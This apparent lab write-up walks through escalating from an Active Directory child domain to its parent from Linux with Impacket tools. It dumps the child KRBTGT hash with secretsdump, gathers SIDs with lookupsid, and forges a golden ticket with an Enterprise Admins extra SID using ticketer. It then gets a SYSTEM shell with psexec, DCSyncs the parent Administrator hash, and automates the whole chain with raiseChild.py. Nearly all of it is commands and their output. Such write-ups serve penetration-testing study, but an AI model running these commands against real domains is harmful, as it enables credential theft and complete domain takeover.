---
title: Attacking Child-Parent Trust From Linux
date: 2025-12-02 23:57:51
categories:
  - Active Directory
  - Exploitation
  - Domain Trusts
  - Abuse Child-Parent Trust From Linux
tags:
  - secretsdump
  - lookupsid
  - ticketer
---

> Attacking Domain Trusts – Child → Parent Trusts relies on manipulating the `SID History attribute` to add a high-privilege group SID, allowing an attacker in the child domain to escalate privileges and access the parent domain as `SYSTEM`.

# Manually

### Prerequisite

> To successfully get access to the parent domain we need first :
>
>   * The KRBTGT hash of the child domain ( To Sign the Golden Ticket ).
>   * The SID of the child domain.
>   * The FQDN of the child domain.
>   * The name of a target user in the child domain (doesn’t need to exist!).
>   * The SID of the Enterprise Admins Group of the parent domain.
>

### Extraction Of KRBTGT Hash Of The Child Domain

```bash
secretsdump.py child-FQDN-domain/our-privileged-user@child-domain-dc-ip -just-dc-user NETBIOS_DOMAIN/krbtgt

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
```

FQDN : `LOGISTICS.INLANEFREIGHT.LOCAL`.

krbtgt : `9d765b482771505cbe97411065964d5f`.

### Extracting Child Domain SID

```bash
lookupsid.py child-FQDN-domain/our-privileged-user@child-dc-ip | grep "Domain SID"
```

### Extracting Parent Domain SID & Attaching to Enterprise Admins’s RID

```bash
lookupsid.py child-FQDN-domain/our-privileged-user@parent-dc-ip

[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114

519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
```

> ➜ `Enterprise-Admins-SID` : S-1-5-21-3842939050-3880317879-2865463114-519

### Craft A Golden Ticket

> ➜ With this command, we craft a golden ticket for `non existing user ( twistzz )` and inject in the `SID History` attribute the SID of the `Enterprise Admins` Group.

```bash
ticketer.py -nthash KRBTGT-hash -domain child-domain-FQDN -domain-sid child-domain-SID -extra-sid Enterprise-Admins-SID twistzz

[*] Saving ticket in twistzz.ccache
```

### Getting a SYSTEM Shell

```bash
export KRB5CCNAME=twistzz.ccache

psexec.py child-FQDN-domain/twistzz@dc.parent-FQDN-domain -k -no-pass -target-ip parent-dc-ip
```

### DCSync The Parent Domain

```bash
secretsdump.py twistzz@dc.parent-FQDN-domain -k -no-pass -just-dc-ntlm -just-dc-user Administrator
```

# Automatically

### raiseChild

> We `need to specify the target domain controller` and `credentials for an administrative user in the child domain`, the script will do the rest :
>
>   * Obtains the SID for the Enterprise Admins group of the parent domain
>   * Retrieves the hash for the KRBTGT account in the child domain
>   * Creates a Golden Ticket
>   * Logs into the parent domain
>   * Retrieves credentials for the Administrator account in the parent domain
>

```bash
raiseChild.py -target-exec Parent-DC-IP Child-domain/our-privileged-user

C:\Windows\system32>whoami

nt authority\system
```
